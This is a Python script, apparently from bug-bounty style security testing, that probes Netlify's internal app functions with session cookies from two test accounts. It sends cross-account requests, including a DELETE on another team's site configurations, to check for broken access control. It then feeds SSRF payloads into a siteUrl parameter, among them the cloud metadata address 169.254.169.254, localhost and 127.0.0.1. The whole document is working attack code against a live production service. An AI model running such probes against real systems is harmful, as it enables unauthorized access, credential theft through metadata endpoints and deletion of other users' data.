# -*- coding: utf-8 -*-
"""Netlify app 域内部函数:交叉归属测试 + siteUrl 参数 SSRF 探测
只读端点优先;写端点(delete-configurations)仅观察返回码"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B

SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
TEAM_A = '6a979dd2ae93f47d55b62897'
TEAM_B = '6a97b6454fef0db964f75db6'
ctx = ssl.create_default_context()

def req(cookie, path, method='GET', body=None, headers=None, timeout=25):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json',
         'Cookie': cookie, 'Content-Type': 'application/json'}
    if headers:
        h.update(headers)
    payload = None
    if body is not None:
        payload = json.dumps(body).encode()
    try:
        conn.request(method, path, body=payload, headers=h)
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st = r.status
        conn.close()
        return st, raw
    except Exception as e:
        return 'ERR', str(e)[:80].encode()

def show(label, cookie, path, method='GET', body=None, headers=None):
    st, raw = req(cookie, path, method, body, headers)
    print('%-52s %s %s' % (label, st, raw[:220].decode('utf-8', 'replace').replace('\n', ' ')))

# 1. B cookie 访问 A 的扩展资源(越权探测)
show('B->A extension-proxy hostsite',   COOKIE_B, '/.netlify/functions/extension-proxy?teamId=%s&slug=integration-host-site/%s' % (TEAM_A, SITE_A))
show('B->A relevant-ext-for-site',      COOKIE_B, '/.netlify/functions/fetch-relevant-installed-extensions-for-site?teamId=%s&siteId=%s' % (TEAM_A, SITE_A))
show('B->A ext-for-team',               COOKIE_B, '/.netlify/functions/fetch-installed-extensions-for-team?teamId=%s' % TEAM_A)
show('B->A fetch-extensions',           COOKIE_B, '/.netlify/functions/fetch-extensions?teamId=%s' % TEAM_A)
show('B->A delete-config-for-site',     COOKIE_B, '/.netlify/functions/delete-configurations-for-site?teamId=%s&siteId=%s' % (TEAM_A, SITE_A), 'DELETE', {'teamId': TEAM_A, 'siteId': SITE_A})
print()

# 2. 自有权对照
show('A->A ext-for-team',               COOKIE_A, '/.netlify/functions/fetch-installed-extensions-for-team?teamId=%s' % TEAM_A)
show('A->A relevant-ext-for-site',      COOKIE_A, '/.netlify/functions/fetch-relevant-installed-extensions-for-site?teamId=%s&siteId=%s' % (TEAM_A, SITE_A))
show('B->B ext-for-team',               COOKIE_B, '/.netlify/functions/fetch-installed-extensions-for-team?teamId=%s' % TEAM_B)
show('B->B relevant-ext-for-site',      COOKIE_B, '/.netlify/functions/fetch-relevant-installed-extensions-for-site?teamId=%s&siteId=%s' % (TEAM_B, SITE_B))
print()

# 3. fetch-extension-host-site-sdk-version:siteUrl 参数探测(SSRF?)
urls = [
    ('own site',     'https://sec-test-rcf6lz.netlify.app'),
    ('other site',   'https://sec-b-08v4pk.netlify.app'),
    ('example.com',  'https://example.com'),
    ('imds',         'http://169.254.169.254/latest/meta-data/'),
    ('localhost',    'http://localhost:80/'),
    ('127.0.0.1',    'http://127.0.0.1:80/'),
]
for label, u in urls:
    st, raw = req(COOKIE_B, '/.netlify/functions/fetch-extension-host-site-sdk-version', 'POST', {'siteUrl': u})
    print('%-16s sdk-version %s %s' % (label, st, raw[:200].decode('utf-8', 'replace').replace('\n', ' ')))
